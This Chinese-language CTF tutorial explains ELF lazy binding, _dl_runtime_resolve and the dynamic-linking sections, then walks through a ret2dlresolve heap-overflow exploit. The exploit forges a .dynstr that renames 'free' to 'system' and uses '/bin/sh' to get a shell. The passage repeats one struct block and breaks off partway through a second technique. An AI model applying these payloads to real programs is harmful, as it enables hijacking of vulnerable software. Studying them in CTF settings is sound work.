# 基本概念
以例子来说明一些概念：
    #include 
    int main()
    {
       puts("Hello Pwn\n");
       return 0;
    }
    //gcc -m32 -fno-stack-protector -no-pie -s hellopwn.c
动调一下：  
跟进puts，看到jmp到了一个并不是libc的地址，正是因为延迟绑定。然后push了一个0，再push了一个0x80482d0地址，最后跳到_dl_runtime_resolve去执行。  
`_dl_runtime_resolve(link_map,reloc_arg)`
先说`0x80482d0`，是link_map的地址，其结构包含了`.dynamic`指针，通过link_map，_dl_runtime_resolve可以访问到.dynamic这个section。
再来看一些比较重要的section
  * .dynamic
这个section包含了很多动态链接需要的信息，但是我们着重关注三个点：  
`DT_STRTAB`、`DT_SYMTAB`、`DT_JMPREL`  
这三项跟别包含了指向对应section的指针：  
`.dynstr`、`.dynsym`、`.rel.plt`
    root@16-223:/pwn/ret2dlresolve# readelf -S hello
    There are 29 section headers, starting at offset 0x114c:
    Section Headers:
      [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
      [ 0]                   NULL            00000000 000000 000000 00      0   0  0
      [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
      [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
      [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
      [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
      [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4
      [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1
      [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2
      [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4
      [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4
      [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4
      [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4
      [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16
      [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8
      [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16
      [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4
      [16] .rodata           PROGBITS        080484b8 0004b8 000013 00   A  0   0  4
      [17] .eh_frame_hdr     PROGBITS        080484cc 0004cc 00002c 00   A  0   0  4
      [18] .eh_frame         PROGBITS        080484f8 0004f8 0000cc 00   A  0   0  4
      [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
      [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
      [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
      [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
      [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
      [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4
      [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4
      [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1
      [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1
      [28] .shstrtab         STRTAB          00000000 001051 0000fa 00      0   0  1
    Key to Flags:
      W (write), A (alloc), X (execute), M (merge), S (strings)
      I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
      O (extra OS processing required) o (OS specific), p (processor specific)
通过上述命令可以看到对应section的地址，可以看到和IDA给出的地址是一致的。
  * .dynstr
这就是字符串表，index为0的值永远为0。下面就是动态链接用到的字符串(包括函数名)，每个均以0为结尾。引用时即以下标相对0x804821C来偏移。
  * .dynsym
符号表(结构体数组)，记录了符号信息，每个结构体对应一个符号。我们关心符号本身，例如puts。结构体如下:
    typedef struct
    {
      Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
      Elf32_Addr    st_value;
      Elf32_Word    st_size;
      unsigned char st_info; //对于导入函数符号而言，它是0x12
      unsigned char st_other;
      Elf32_Section st_shndx;
    }Elf32_Sym; //对于导入函数符号而言，其他字段都是0
  * .rel.plt
重定位表(结构体数组)，每个结构体对应一个导入函数，结构体如下：
    typedef struct
    {
      Elf32_Addr    r_offset; //指向GOT表的指针
      Elf32_Word    r_info;
      //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)>>8)，忽略那个07
      //1和3是这个导入函数的符号在.dynsym中的下标，
      //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
    } Elf32_Rel;
重定位表(结构体数组)，每个结构体对应一个导入函数，结构体如下：
    typedef struct
    {
      Elf32_Addr    r_offset; //指向GOT表的指针
      Elf32_Word    r_info;
      //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)>>8)，忽略那个07
      //1和3是这个导入函数的符号在.dynsym中的下标，
      //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
    } Elf32_Rel;
# _dl_runtime_resolve
​  
说完基本概念，来看看`_dl_runtime_resolve(link_map,reloc_arg)`具体做了些什么。
  1. 访问.dynamic，取出.dysym、.dystr、.rel.plt指针。
  2. .rel.plt+reloc_arg，求出当前函数的重定位表项Elf32_Rel的指针，记作rel。
  3. 做rel->r_info >> 8运算作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym指针，记作sym。
  4. .dynstr + sym->st_name得出符号字符串指针。
  5. 在动态链接库查找该函数地址，并将地址赋值给*rel->r_offset，即GOT表。
  6. 调用该函数。  
​  
# x86-利用-1  
​  
当安全机制为No
RELRO时才可利用(即.dynamic可写)，因要从.dynamic拿到.dynstr字符串表的指针加上偏移即函数名字符串，假设我们可以改写指针到可操作空间，即可修改正常函数偏移为想执行的函数，达到劫持程序流的目的。  
​  
看个例子：
add功能，先calloc一个作为结构体，里面存放了下面calloc的chunk的地址，然后size可以自定义，再calloc一个chunk用来存内容。需要注意的是只读了1个字节，换算下来应该用p8来发送。
需要特别注意一下read这个函数，输入多少字节一定要补齐，不然不会继续接受下一步，例如0x20的chunk要输入满0x20，而不能习惯用4个字节代替。
再来看edit:
重新输入了size，因此这里存在堆溢出的情况。
free，经过动调这个函数有点迷。准确的说是chunk_list指针有点问题，修改0下标的修改不了。
整个程序没有任何输出，只是存在堆溢出，可以通过修改struct
chunk中的地址实现任意地址写。没有好的leak地址的方法，但是我们可以通过修改.dynstr来劫持程序。
在bss段上先伪造一个.dynstr结构:
    ########################
        new(0x10,'a'*0x10)#0
        new(0x10,'b'*0x10)#1
        new(0x10,'c'*0x10)#2
        new(0x10,'/bin/sh\x00'.ljust(0x10,'d'))#3
        fake_dynstr_address = 0x0000000006020E0
        free_offset = 0x0000000000400457 - 0x00000000004003F8
        libc_offset = 0x000000000040046B - 0x000000000040045E
        fake_dynstr = b'\x00' * free_offset + b'system\x00'
        fake_dynstr+= b'\x00' * libc_offset
        fake_dynstr+= b'GLIBC_2.4\x00GLIBC_2.2.5\x00'
        strtab = 0x601EA8 + 0x8
        payload = b'A' * 0x10 + p64(0) + p64(0x21) + p64(0) + p64(fake_dynstr_address)
        edit(1,len(payload),payload)
构造payload的时候要注意一个问题，因为dynstr是字符串，所以偏移计算要注意：
正常是free\x00字符串，修改成system\x00的话那么后面补0要从0x400457+7也就是0x40045E开始。
通过edit(1)修改2下标chunk结构体中的指针:
上图这个0x80是我测试的时候写测，正常0x10也ok。
然后edit(2)，我们构造的fake_dynstr就会写到bss段上:  
`edit(2,len(fake_dynstr),fake_dynstr)`
然后再修改dynamic中的strtab为我们伪造的这个地址:
    payload = b'A' * 0x10 + p64(0) + p64(0x21) + p64(0) + p64(strtab)
        edit(1,len(payload),payload)
        edit(2,0x8,p64(fake_dynstr_address))
修改成功，触发free即可（因为free还没有调用过，调用过如何利用看利用3）。
# x86-利用-2
当dynamic不能写的时候，利用1就失效了，还有另外一种利用方式是修改_dl_runtime_resolve的第二个参数，再来看它的执行流程:
  1. 访问.dynamic，取出.dysym、.dystr、.rel.plt指针。
  2. .rel.plt+reloc_arg，求出当前函数的重定位表项Elf32_Rel的指针，记作rel。
  3. 做rel->r_info >> 8运算作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym指针，记作sym。